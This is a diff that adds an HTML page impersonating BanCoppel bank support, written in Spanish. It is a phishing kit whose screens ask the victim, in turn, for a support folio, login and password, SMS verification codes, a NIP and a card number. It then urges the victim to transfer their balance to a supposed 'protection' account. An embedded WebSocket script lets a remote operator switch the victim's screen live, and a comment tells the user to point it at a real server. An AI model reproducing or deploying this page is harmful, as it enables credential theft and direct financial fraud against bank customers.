@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>BanCoppel | Soporte</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 0; background: #fff; }
+    header { background-color: #1A4A7A; color: white; padding: 20px; text-align: center; }
+    footer {
+      background-color: #1A4A7A; color: white; text-align: center; padding: 10px; margin-top: 40px;
+    }
+    .footer-links {
+      background: #f9f9f9; padding: 10px; text-align: center; font-size: 14px;
+    }
+    .container {
+      max-width: 400px;
+      margin: 40px auto;
+      padding: 20px;
+      border: 1px solid #eee;
+      border-radius: 10px;
+      text-align: center;
+    }
+    .container img { max-width: 150px; margin-bottom: 20px; }
+    .container input {
+      width: 90%;
+      padding: 10px;
+      margin: 10px auto;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    .btn {
+      background-color: #FFD700;
+      color: black;
+      border: none;
+      padding: 10px 25px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+
+<header>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/6/67/BanCoppel_logo.svg" alt="BanCoppel" style="height: 50px;"><br>
+  <strong>7 de abril de 2025</strong>
+</header>
+
+<!-- FOLIO -->
+<div id="pantalla-folio" class="container">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/6/67/BanCoppel_logo.svg" alt="logo">
+  <h2>Folio de soporte:</h2>
+  <p>Por favor, ingrese el folio de soporte técnico que su ejecutivo en línea le proporcionó.</p>
+  <input type="text" placeholder="Ingrese su número de folio" />
+  <button class="btn">Ingresar</button>
+</div>
+
+<!-- LOGIN -->
+<div id="pantalla-login" class="container hidden">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/6/67/BanCoppel_logo.svg" alt="logo">
+  <h2>Inicio de sesión:</h2>
+  <input type="text" placeholder="Ingrese su usuario" />
+  <input type="password" placeholder="Ingrese su contraseña" />
+  <button class="btn">Ingresar</button>
+</div>
+
+<!-- VERIFICACIÓN -->
+<div id="pantalla-codigo" class="container hidden">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/6/67/BanCoppel_logo.svg" alt="logo">
+  <h2>Hemos enviado un código de verificación</h2>
+  <p>Ingresa el código que recibiste en tu número celular terminación: <strong>9949</strong></p>
+  <input type="text" placeholder="Ingrese el SMS Recibido" />
+  <button class="btn">Continuar</button>
+</div>
+
+<!-- NIP -->
+<div id="pantalla-nip" class="container hidden">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/6/67/BanCoppel_logo.svg" alt="logo">
+  <h2>Ingrese su NIP de confirmación</h2>
+  <p>Para confirmar la cancelación del cargo no reconocido.</p>
+  <input type="password" placeholder="NIP de confirmación" />
+  <button class="btn">Validar</button>
+</div>
+
+<!-- PROTEGER SALDO -->
+<div id="pantalla-proteger" class="container hidden">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/6/67/BanCoppel_logo.svg" alt="logo">
+  <h2>¡Es necesario proteger su saldo!</h2>
+  <p>Crearemos una cuenta gratuita de SU TOTAL PROTECCIÓN para respaldar su fondo disponible.</p>
+  <p>Saldo sin proteger: <strong>$</strong></p>
+</div>
+
+<!-- TRANSFERENCIA -->
+<div id="pantalla-transferir" class="container hidden">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/6/67/BanCoppel_logo.svg" alt="logo">
+  <h2>Cuenta SU TOTAL PROTECCIÓN creada exitosamente</h2>
+  <p>Transfiera el saldo disponible a la siguiente cuenta:</p>
+  <p><strong>Alias:</strong> Cuenta de respaldo.</p>
+</div>
+
+<!-- TARJETA PROTECCIÓN -->
+<div id="pantalla-tarjeta" class="container hidden">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/6/67/BanCoppel_logo.svg" alt="logo">
+  <h2>Protección adicional</h2>
+  <p>Agregaremos protección adicional a su tarjeta de crédito/débito.</p>
+  <input type="text" placeholder="Número de tarjeta" />
+  <button class="btn">Continuar</button>
+</div>
+
+<!-- CANCELACIÓN -->
+<div id="pantalla-cancelacion" class="container hidden">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/6/67/BanCoppel_logo.svg" alt="logo">
+  <h2>Cancelación de cargos:</h2>
+  <p>Ingrese el código SMS que recibió al autorizar una compra.</p>
+  <input type="text" placeholder="Ingrese el SMS Recibido" />
+  <button class="btn">Continuar</button>
+</div>
+
+<!-- CANCELACIÓN EXITOSA -->
+<div id="pantalla-exitosa" class="container hidden">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/6/67/BanCoppel_logo.svg" alt="logo">
+  <h2>Cancelación exitosa</h2>
+  <p>Comercio: <strong>[nombre del comercio]</strong></p>
+  <p>Monto devuelto: <strong>$</strong></p>
+  <p>En un lapso no mayor a 72 horas el monto devuelto volverá a estar disponible.</p>
+</div>
+
+<!-- Footer -->
+<div class="footer-links">
+  Aprende más | Ayuda | Términos y condiciones | Seguridad en línea
+</div>
+<footer>
+  Contactanos | Aclaraciones | Promociones | Facebook | Youtube <br>
+  Copyright 2022 Bancoppel S.A Institución de Banca Múltiple - Todos los derechos reservados
+</footer>
+
+<script>
+  const socket = new WebSocket('ws://localhost:3000'); // Cambia esto a tu WebSocket real
+
+  const pantallas = [
+    'folio', 'login', 'codigo', 'nip', 'proteger', 'transferir',
+    'tarjeta', 'cancelacion', 'exitosa'
+  ];
+
+  function mostrarPantalla(nombre) {
+    pantallas.forEach(id => {
+      const div = document.getElementById(`pantalla-${id}`);
+      div.classList.add('hidden');
+    });
+    document.getElementById(`pantalla-${nombre}`).classList.remove('hidden');
+  }
+
+  socket.onmessage = function(event) {
+    const mensaje = event.data;
+    if (pantallas.includes(mensaje)) {
+      mostrarPantalla(mensaje);
+    }
+  };
+</script>
+
+</body>
+</html>
